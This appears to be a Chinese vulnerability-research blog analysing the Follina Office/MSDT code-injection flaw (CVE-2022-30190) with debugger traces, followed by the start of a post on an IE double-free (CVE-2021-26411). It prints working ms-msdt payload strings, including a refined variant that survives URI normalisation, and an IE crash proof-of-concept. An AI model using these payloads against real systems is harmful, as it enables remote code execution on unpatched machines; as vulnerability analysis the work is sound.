<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-52-02.png" alt="Snipaste_2022-06-08_09-52-02" /></p>

<p>整个漏洞利用链如图所示：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220815170312333.png" alt="image-20220815170312333" /></p>

<h2 id="漏洞利用细节">漏洞利用细节</h2>

<h3 id="word解析url">word解析URL</h3>

<p>word在解析ms-msdt Office URL时是通过mshtml.dll的ShellExecURL函数解析的，而该函数内部会调用ShellExecuteW执行命令行参数创建msdt.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000
rdx=0000000000000000 rsi=0000000080004005 rdi=00000267dfbe07f0
rip=00007ffa2fe2fe45 rsp=000000f644b0d410 rbp=000000f644b0d510
 r8=00000267dfb84838  r9=0000000000000000 r10=0000000000000000
r11=0000000000000246 r12=00007ffa3086e358 r13=0000000000000000
r14=0000000000000000 r15=0000000000000020
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL+0x24d:
00007ffa`2fe2fe45 48ff1554b8c600  call    qword ptr [mshtml!_imp_ShellExecuteW (00007ffa`30a9b6a0)] ds:00007ffa`30a9b6a0={mshtml!_imp_load_ShellExecuteW (00007ffa`2f8edaaa)}
0:000&gt; du r8		//ShellExecuteW的执行参数
00000267`dfb84838  "ms-msdt:/id PCWDiagnostic /skip "
00000267`dfb84878  "force /param "IT_RebrowseForFile"
00000267`dfb848b8  "=cal?c IT_SelectProgram=NotListe"
00000267`dfb848f8  "d IT_BrowseForFile=h$(IEX('calc."
00000267`dfb84938  "exe'))i/../../../../../../../../"
00000267`dfb84978  "../../../../../../Windows/System"
00000267`dfb849b8  "32/mpsigstub.exe ""
0:000&gt; k			//函数调用栈
 # Child-SP          RetAddr           Call Site
00 00000092`064fccc8 00007ffa`707502de SHELL32!ShellExecuteNormal
01 00000092`064fccd0 00007ffa`707d8f11 SHELL32!ShellExecuteExW+0xde
02 00000092`064fce70 00007ffa`2fe2fe4c SHELL32!ShellExecuteW+0x81
03 00000092`064fcf30 00007ffa`2fe2ee3a mshtml!ShellExecURL+0x254
04 00000092`064fd1f0 00007ffa`2fb4e721 mshtml!OpenInNewWindow+0x38e
05 00000092`064fd3e0 00007ffa`2f6206cf mshtml!CDoc::DoNavigate_NavigateInNewBrowser+0x201
06 00000092`064fd470 00007ffa`2f619f00 mshtml!CDoc::DoNavigate+0xbaf
07 00000092`064fd7c0 00007ffa`2f751420 mshtml!CDoc::FollowHyperlink2+0xc70
08 00000092`064fd9c0 00007ffa`2f75072b mshtml!CWindow::FollowHyperlinkHelper+0x2a4
09 00000092`064fdb40 00007ffa`2f74a704 mshtml!CWindow::NavigateEx+0xeb
0a 00000092`064fdcb0 000001c0`4fad4802 mshtml!COmLocationProxy::InvokeEx+0x4f4
0b 00000092`064fddc0 000001c0`4fad468e jscript9!HostDispatch::CallInvokeExInternal+0xf2
0c 00000092`064fde60 000001c0`4fad4540 jscript9!HostDispatch::CallInvokeHandler+0x96
0d 00000092`064fdee0 000001c0`4fb8afb6 jscript9!HostDispatch::CallInvokeEx+0x90
0e 00000092`064fdf70 000001c0`4fb8aed3 jscript9!HostDispatch::PutValueByDispId+0xd6
0f 00000092`064fe030 000001c0`4fa50ce1 jscript9!HostDispatch::PutValue+0x37
10 00000092`064fe070 000001c0`4fa54a1e jscript9!Js::JavascriptOperators::OP_SetProperty+0x1d1
11 00000092`064fe100 000001c0`4fa43f43 jscript9!Js::JavascriptOperators::PatchPutValueNoFastPath+0x7e
12 00000092`064fe180 000001c0`4fa47a2d jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty&lt;Js::OpLayoutElementCP_OneByte const &gt;+0x183
13 00000092`064fe240 000001c0`4fa45029 jscript9!Js::InterpreterStackFrame::Process+0x6cd
14 00000092`064fe2c0 000001c0`4ff00fc3 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x4c9
15 00000092`064fe4d0 000001c0`4fb0afb6 0x000001c0`4ff00fc3
16 00000092`064fe500 000001c0`4f9eb3d1 jscript9!amd64_CallFunction+0x86
17 00000092`064fe550 000001c0`4fa9abc9 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x71
18 00000092`064fe5c0 000001c0`4fa9aab0 jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xfd
19 00000092`064fe690 000001c0`4fa9aa0b jscript9!Js::JavascriptFunction::CallRootFunction+0x64
1a 00000092`064fe700 000001c0`4fa9a929 jscript9!ScriptSite::CallRootFunction+0x67
1b 00000092`064fe760 000001c0`4fa9ae80 jscript9!ScriptSite::Execute+0x109
1c 00000092`064fe7f0 000001c0`4fa20430 jscript9!ScriptEngine::ExecutePendingScripts+0x234
1d 00000092`064fe8e0 000001c0`4faf6924 jscript9!ScriptEngine::ParseScriptTextCore+0x49c
1e 00000092`064fea40 00007ffa`2f81e0c8 jscript9!ScriptEngine::ParseScriptText+0xc4
1f 00000092`064feaf0 00007ffa`2f5a25aa mshtml!CActiveScriptHolder::ParseScriptText+0xb8
20 00000092`064feb70 00007ffa`2f5a0f92 mshtml!CScriptCollection::ParseScriptText+0x25a
21 00000092`064fec50 00007ffa`2f5a09b6 mshtml!CScriptData::CommitCode+0x422
22 00000092`064fee20 00007ffa`2f5a072f mshtml!CScriptData::Execute+0x266
23 00000092`064feed0 00007ffa`2f63fa05 mshtml!CHtmScriptParseCtx::Execute+0xbf
24 00000092`064fef00 00007ffa`2f540767 mshtml!CHtmParseBase::Execute+0x95
25 00000092`064fef90 00007ffa`2f53ffaa mshtml!CHtmPost::Broadcast+0x47
26 00000092`064fefd0 00007ffa`2f80db06 mshtml!CHtmPost::Exec+0x29a
27 00000092`064ff1d0 00007ffa`2f80d9db mshtml!CHtmPost::Run+0x32
28 00000092`064ff200 00007ffa`2f80d96f mshtml!PostManExecute+0x63
29 00000092`064ff240 00007ffa`2f80d4d0 mshtml!PostManResume+0xab
2a 00000092`064ff280 00007ffa`2f875eec mshtml!CHtmPost::OnDwnChanCallback+0x40
2b 00000092`064ff2d0 00007ffa`2f53b0c1 mshtml!CDwnChan::OnMethodCall+0x1c
2c 00000092`064ff300 00007ffa`2f5dca04 mshtml!GlobalWndOnMethodCall+0x2b1
2d 00000092`064ff3b0 00007ffa`2f9854b8 mshtml!GlobalWndProc_SEH+0x104
2e 00000092`064ff440 00007ffa`6fd1e858 mshtml!GlobalWndProc+0x3a8c08
2f 00000092`064ff480 00007ffa`6fd1e299 USER32!UserCallWinProcCheckWow+0x2f8
30 00000092`064ff610 00007ffa`3e081af9 USER32!DispatchMessageWorker+0x249
31 00000092`064ff690 00007ffa`3dfe2009 wwlib!PTLS7::LsNotReached+0x7bd49
32 00000092`064ff730 00007ff6`79e71230 wwlib!FMain+0x61
33 00000092`064ff760 00007ff6`79e71519 winword+0x1230
34 00000092`064ff790 00007ffa`71177034 winword+0x1519
35 00000092`064ff7d0 00007ffa`71362651 KERNEL32!BaseThreadInitThunk+0x14
36 00000092`064ff800 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>ShellExecuteW内部则是通过CreateRemoteThreadEx创建新线程，通过新线程创建msdt.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:027&gt; r
rax=0000000002000000 rbx=0000000000000000 rcx=000000e48ad4d438
rdx=000000e48ad4d4a0 rsi=0000021054c22ee0 rdi=0000000000000000
rip=00007ffada60e620 rsp=000000e48ad4d358 rbp=000000e48ad4eb00
 r8=0000000002000000  r9=0000000002000000 r10=0000000000000000
r11=000000e48ad4d300 r12=0000000000000001 r13=0000000000000002
r14=0000000000000008 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtCreateUserProcess:
00007ffa`da60e620 4c8bd1          mov     r10,rcx
0:027&gt; dps poi(esp+98) La8/8			//AttributeList
000000e4`8ad4df00  00000000`000000a8
000000e4`8ad4df08  00000000`00020005	//PS_ATTRIBUTE_IMAGE_NAME
000000e4`8ad4df10  00000000`00000040	//NtImagePath.Length
000000e4`8ad4df18  00000210`54bae7b0	//NtImagePath.Buffer
000000e4`8ad4df20  00000000`00000000
000000e4`8ad4df28  00000000`00010003
000000e4`8ad4df30  00000000`00000010
000000e4`8ad4df38  000000e4`8ad4d7c0
000000e4`8ad4df40  00000000`00000000
000000e4`8ad4df48  00000000`00000006
000000e4`8ad4df50  00000000`00000040
000000e4`8ad4df58  000000e4`8ad4d900
000000e4`8ad4df60  00000000`00000000
000000e4`8ad4df68  00000000`00020009
000000e4`8ad4df70  00000000`00000004
000000e4`8ad4df78  000000e4`8ad4d6f0
000000e4`8ad4df80  00000000`00000000
000000e4`8ad4df88  00000000`0006001a
000000e4`8ad4df90  00000000`00000001
000000e4`8ad4df98  00000000`00000001
000000e4`8ad4dfa0  00000000`00000000
0:027&gt; du 00000210`54bae7b0				//创建的进程名
00000210`54bae7b0  "\??\C:\Windows\system32\msdt.exe"
00000210`54bae7f0  ""
0:027&gt; k								//创建msdt.exe的线程调用栈
 # Child-SP          RetAddr           Call Site
00 000000e4`8ad4d358 00007ffa`d8128e73 ntdll!NtCreateUserProcess
01 000000e4`8ad4d360 00007ffa`d81271a6 KERNELBASE!CreateProcessInternalW+0xfe3
02 000000e4`8ad4e930 00007ffa`d89dcbb4 KERNELBASE!CreateProcessW+0x66
03 000000e4`8ad4e9a0 00007ffa`d5f1152d KERNEL32!CreateProcessWStub+0x54
04 000000e4`8ad4ea00 00007ffa`d5ea6722 windows_storage!CInvokeCreateProcessVerb::CallCreateProcess+0x2cd
05 000000e4`8ad4ecb0 00007ffa`d5f0a75c windows_storage!CInvokeCreateProcessVerb::_PrepareAndCallCreateProcess+0x2d6
06 000000e4`8ad4ed30 00007ffa`d5f0a583 windows_storage!CInvokeCreateProcessVerb::_TryCreateProcess+0x3c
07 000000e4`8ad4ed60 00007ffa`d5f0a46d windows_storage!CInvokeCreateProcessVerb::Launch+0xef
08 000000e4`8ad4ee00 00007ffa`d5f49dc4 windows_storage!CInvokeCreateProcessVerb::Execute+0x5d
09 000000e4`8ad4ee40 00007ffa`d5e31d87 windows_storage!CBindAndInvokeStaticVerb::InitAndCallExecute+0x214
0a 000000e4`8ad4eec0 00007ffa`d5ea5787 windows_storage!CBindAndInvokeStaticVerb::TryCreateProcessDdeHandler+0x63
0b 000000e4`8ad4ef40 00007ffa`d5ef586d windows_storage!CBindAndInvokeStaticVerb::Execute+0x1e7
0c 000000e4`8ad4f260 00007ffa`d5ef5785 windows_storage!RegDataDrivenCommand::_TryInvokeAssociation+0xad
0d 000000e4`8ad4f2c0 00007ffa`d9b92b22 windows_storage!RegDataDrivenCommand::_Invoke+0x141
0e 000000e4`8ad4f330 00007ffa`d9b929da SHELL32!CRegistryVerbsContextMenu::_Execute+0xce
0f 000000e4`8ad4f3a0 00007ffa`d9b9630c SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
10 000000e4`8ad4f6a0 00007ffa`d9b9618d SHELL32!HDXA_LetHandlerProcessCommandEx+0x10c
11 000000e4`8ad4f7b0 00007ffa`d9b926ab SHELL32!CDefFolderMenu::InvokeCommand+0x13d
12 000000e4`8ad4fb10 00007ffa`d9b92583 SHELL32!CShellExecute::_InvokeInProcExec+0xfb
13 000000e4`8ad4fc10 00007ffa`d9bcd671 SHELL32!CShellExecute::_InvokeCtxMenu+0x5b
14 000000e4`8ad4fc50 00007ffa`d9bac32d SHELL32!CShellExecute::_DoExecute+0x151
15 000000e4`8ad4fcc0 00007ffa`da48c3f9 SHELL32!&lt;lambda_519a2c088cd7d0cdfafe5aad47e70646&gt;::&lt;lambda_invoker_cdecl&gt;+0x2d
16 000000e4`8ad4fd30 00007ffa`d89d7034 SHCORE!_WrapperThreadProc+0xe9
17 000000e4`8ad4fe10 00007ffa`da5c2651 KERNEL32!BaseThreadInitThunk+0x14
18 000000e4`8ad4fe40 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>分析word解析URL是因为在尝试缩减payload的过程中发现了缩减后的payload能在cmd上成功执行命令，但是内嵌到docx文档中则无法执行，于是探索了一番。</p>

<h3 id="一些尝试">一些尝试</h3>

<p>原本的payload可以直接在cmd上运行，其中有些参数是不必要的，最终缩减的payload为<code class="language-plaintext highlighter-rouge">msdt /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"</code>，将payload替换到poc.html中<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../../$(calc).exe \" ";</code>。然而该payload却无法在word中执行成功，procmon抓到的参数是不完整的：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-02.png" alt="Snipaste_2022-06-08_09-53-02" /></p>

<p>重新调试word，断在ShellExecURL，发现到该函数时命令行的参数已经变成<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /$(calc).exe</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=000002c0dc60fc00
rdx=000002c0cdec0000 rsi=000002c8e5144200 rdi=000002c8e5190400
rip=00007ffa9737fbf8 rsp=000000fbbf39d748 rbp=000000fbbf39d850
 r8=000002c0cde50d20  r9=0000000000000001 r10=0000000000008000
r11=000000fbbf39d5a0 r12=00007ffa97dbe358 r13=0000000000000000
r14=0000000000000000 r15=000002c0df5435d0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL:
00007ffa`9737fbf8 488bc4          mov     rax,rsp
0:000&gt; du 000002c0df5438a0 
000002c0`df5438a0  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>向前回溯在执行函数<code class="language-plaintext highlighter-rouge">iertutil!CreateUri</code>后，传入的参数被截断：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=00000000000000dc rbx=000000000000006e rcx=000000b3c48fbe10
rdx=0000000003002b85 rsi=000001f1917fe9a8 rdi=0000000000000000
rip=00007ffa96d34a77 rsp=000000b3c48fbdb0 rbp=000000b3c48fbeb0
 r8=0000000000000000  r9=000000b3c48fbde8 r10=0000000000000000
r11=000000000000006e r12=000000b3c48fdeb0 r13=0000000000000000
r14=000000b3c48fdec8 r15=000000000000006e
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!GetFullyExpandedUri+0x12b:
00007ffa`96d34a77 48ff1572c7f600  call    qword ptr [mshtml!_imp_CreateUri (00007ffa`97ca11f0)] ds:00007ffa`97ca11f0={iertutil!CreateUri (00007ffa`ce4ffa10)}
0:000&gt; du rcx											//传入的参数
000000b3`c48fbe10  "ms-msdt:/id PCWDiagnostic /skip "
000000b3`c48fbe50  "force /param "IT_LaunchMethod=Co"
000000b3`c48fbe90  "ntextMenu IT_BrowseForFile=/../."
000000b3`c48fbed0  "./$(calc).exe""
0:000&gt; dps r9 L1										//传出的IUri结构指针
000000b3`c48fbde8  00000000`00000000
0:000&gt; p
mshtml!GetFullyExpandedUri+0x132:
00007ffa`96d34a7e 0f1f440000      nop     dword ptr [rax+rax]
0:000&gt; du poi(poi(000000b3`c48fbde8)+68)				//执行完函数后返回的IUri结构所指的URI字符串
000001f1`8a2bc560  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>此时查看MSDN对于<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)">CreateUri</a>函数的说明，发现对于传入的URI会进行规范化，会删除相对路径段”./”和”../”，并酌情缩短路径，因此原本的参数会被截断。</p>

<p>但是原payload中的”./”和”../”被保留下来了，分析后得知在如果参数中有”?”符号，则后面的内容不会被截断，于是重新编写payload<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_ReBrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"";</code>能成功执行：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-33.png" alt="Snipaste_2022-06-08_09-53-33" /></p>

<h1 id="漏洞原理分析">漏洞原理分析</h1>

<h2 id="windows-troubleshooting-platformwtp简介">Windows Troubleshooting Platform（WTP）简介</h2>

<h3 id="wtp架构">WTP架构</h3>

<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/about-wtp">WTP</a>由一个 Windows 故障排除运行引擎、结果报告和调试报告、四个故障排除 cmdlet 和一个托管的 Windows PowerShell 运行环境组成，不同的Windows故障排除包会调用不同PowerShell Script，并输出对应的结果报告和调试报告。下图显示了 WTP 架构：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/architecture.png" alt="architecture" /></p>

<p>Windwos故障排除包既可以通过WTP 向导 (MSDT.exe) 运行（本次漏洞就是通过这种方式），又可以在Windows PowerShell 窗口中运行，通过Windows PowerShell 窗口运行故障排除包时msdt.exe不会启动：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-15-57.png" alt="Snipaste_2022-06-08_11-15-57" /></p>

<h3 id="故障排除包troubleshooting-pack的组件">故障排除包（Troubleshooting Pack）的组件</h3>

<p>下图显示了故障排除包中包含的组件：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/manifest.png" alt="manifest" /></p>

<p>故障排除包的设计基于三个步骤或阶段：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verification）。每个阶段都表示为一组 Windows PowerShell 脚本，对应脚本的开头分别为<strong>TS</strong>，<strong>RS</strong>和<strong>VF</strong>。本次漏洞中使用的PCWDiagnostic程序兼容性诊断包就正好有三个对应阶段的不同脚本：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_14-25-03.png" alt="Snipaste_2022-06-08_14-25-03" /></p>

<p>当用户调用PCWDiagnostic程序兼容性诊断包时，WTP 会实例化一个 Windows PowerShell 运行空间来运行脚本，由于对于参数没有正确的过滤导致在执行脚本时会将参数中的”$”解析，导致了代码注入。</p>

<h2 id="调试sdiagnhostexe">调试sdiagnhost.exe</h2>

<p>使用dnSpy调试sdiagnhost.exe，可以利用windbg的工具gflags.exe设置sdiagnhost.exe的debuger为dnSpy.exe：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-44-25.png" alt="Snipaste_2022-06-08_16-44-25" /></p>

<p>执行在命令行执行payload后，sdiagnhost.exe创建后会被dnSpy调试，此时下断在<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.ManagedHost.RunScript() </code>方法，随后启动调试会断在RunScript方法内：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-52-56.png" alt="Snipaste_2022-06-08_16-52-56" /></p>

<p>可以看到待执行的PowerShell指令text中的内容就是scriptPath，随后到达第二个断点。此时text的内容依然是scriptPath，将要执行脚本<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code></p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-59-16.png" alt="Snipaste_2022-06-08_16-59-16" /></p>

<p><code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>脚本获取msdt参数中IT_BrowseForFile部分的内容并调用<code class="language-plaintext highlighter-rouge">Test-Selection</code>方法检查参数是否符合要求：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_18-53-51.png" alt="Snipaste_2022-06-08_18-53-51" /></p>

<p><code class="language-plaintext highlighter-rouge">Test-Selection</code>首先检查了IT_BrowseForFile传入的路径是否存在，接着检查路径后缀名是否为.exe或.msi，符合这两个条件表示路径合法</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-00-08.png" alt="Snipaste_2022-06-08_19-00-08" /></p>

<p>尽管/../../已经超出了C:/的根路径，但是<code class="language-plaintext highlighter-rouge">test-path</code>方法返回的结果仍然为True，因此路径被判定合法：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-05-10.png" alt="Snipaste_2022-06-08_19-05-10" /></p>

<p>随后通过<code class="language-plaintext highlighter-rouge">$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")</code>来过滤传入的路径，测试了appname的过滤效果，发现执行了过滤语句后$(calc)仍然存在</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-34-34.png" alt="Snipaste_2022-06-08_19-34-34" /></p>

<p>最终调用Update-DiagRootCause方法，且传入TARGETPATH和APPNAME：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-33-46.png" alt="Snipaste_2022-06-08_19-33-46" /></p>

<p>在dnSpy下断于<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootCause.ProcessRecord()</code>方法，点击运行后成功断下：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-52-44.png" alt="Snipaste_2022-06-08_19-52-44" /></p>

<p>继续向下调试，调用了<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>，且将APPNAME和TARGETPATH作为参数传入：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-55-45.png" alt="Snipaste_2022-06-08_19-55-45" /></p>

<p>继续运行，发现停在了<code class="language-plaintext highlighter-rouge">RunScript</code>方法，且参数正是APPNAME和TARGETPATH，说明通过调用<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>方法执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，并且将参数APPNAME和TARGETPATH传入到脚本中：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-57-35.png" alt="Snipaste_2022-06-08_19-57-35" /></p>

<p>脚本接收两个参数，并赋给变量$targetPath和$appName，检查$targetPath是否为可执行文件：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-10-50.png" alt="Snipaste_2022-06-08_20-10-50" /></p>

<p>随后分别将$targetPath和$appName当作命令行参数赋给$getDiagCmd，此时命令行中会有注入的代码<code class="language-plaintext highlighter-rouge">$(calc)</code>：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-42-34.png" alt="Snipaste_2022-06-08_20-42-34" /></p>

<p>最终执行命令行，触发代码注入：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-43-30.png" alt="Snipaste_2022-06-08_20-43-30" /></p>

<p>由于在命令行中既有$targetPath，又有$appName，猜想在执行命令时应该会执行两次calc：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-07-25.png" alt="Snipaste_2022-06-09_11-07-25" /></p>

<p>查看procmon的日志，确实发现sdiagnhost.exe创建了calc.exe两次，验证了猜想：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-09-56.png" alt="Snipaste_2022-06-09_11-09-56" /></p>

<h1 id="总结">总结</h1>

<p>样本利用Office远程模板访问远程html，并利用<code class="language-plaintext highlighter-rouge">mshtml!ShellExecURL</code>函数解析了URI，调用了msdt.exe。msdt调用PCWDiagnostic程序兼容性诊断包，构造了特殊的IT_BrowseForFile参数绕过了<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>对于路径是否存在和后缀是否为可执行的校验，将路径作为参数传入并执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，该脚本检测路径后缀为.exe后便直接调用<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>执行了命令行，由于命令行中嵌入了表达式<code class="language-plaintext highlighter-rouge">$(calc)</code>，造成了代码注入触发漏洞。</p>

<p>漏洞本身并不复杂，利用也很简单，但是嵌入rtf格式文件配合预览窗格能构成一个Zero-click漏洞，产生的危害还是很大的。分析漏洞的过程中也学习了很多dotnet程序的调试技巧和PowerShell命令行的执行流程，感谢各位师傅精彩的分析文章。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] CVE-2022-30190 MSDT 代码注入漏洞分析：<em>https://paper.seebug.org/1913/</em></p>

<p>[2] Follina Microsoft Office RCE with MS-MSDT Protocol：<em>https://y4er.com/post/follina-microsoft-office-rce-with-ms-msdt-protocol/</em></p>

<p>[3] Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit：<em>https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/</em></p>

<p>[4] Windows Troubleshooting Platform：<em>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/windows-troubleshooting-toolkit-portal</em></p>

<p>[5] CreateUri function：<em>https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)</em></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。]]></summary></entry><entry><title type="html">CVE-2021-26411漏洞分析</title><link href="http://localhost:4000/2022-02-18/CVE-2021-26411" rel="alternate" type="text/html" title="CVE-2021-26411漏洞分析" /><published>2022-02-18T00:00:00+08:00</published><updated>2022-02-18T00:00:00+08:00</updated><id>http://localhost:4000/2022-02-18/CVE-2021-26411</id><content type="html" xml:base="http://localhost:4000/2022-02-18/CVE-2021-26411"><![CDATA[<h1 id="漏洞信息">漏洞信息</h1>

<p>CVE：CVE-2021-26411</p>

<p>IE版本：IE 9-11</p>

<p>漏洞类型：Double free</p>

<p>漏洞模块：MSHTML.dll<!--more--></p>

<h1 id="漏洞成因">漏洞成因</h1>

<p>POC：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">elem</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">xxx</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">var</span> <span class="nx">attr1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">yyy</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">var</span> <span class="nx">attr2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">zzz</span><span class="dl">'</span><span class="p">);</span> 

<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">valueOf</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">elem</span><span class="p">.</span><span class="nx">clearAttributes</span><span class="p">();</span>
	<span class="k">return</span> <span class="mh">0x1337</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">attr1</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
<span class="nx">attr2</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">attr1</span><span class="p">);</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">attr2</span><span class="p">);</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">removeAttributeNode</span><span class="p">(</span><span class="nx">attr1</span><span class="p">);</span> 
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>在windbg中调试发现崩溃于CAttrValue::GetDISPID中，栈回溯发现漏洞发生于ie9_removeAttributeNodeInternal函数中，于是重新在此下断：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_9-44-45.png" alt="" /></p>

<p>查看IDA反汇编代码，发现传入6个参数，而this指针是通过ECX寄存器传递的：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-7_17-11-9.png" alt="" /></p>

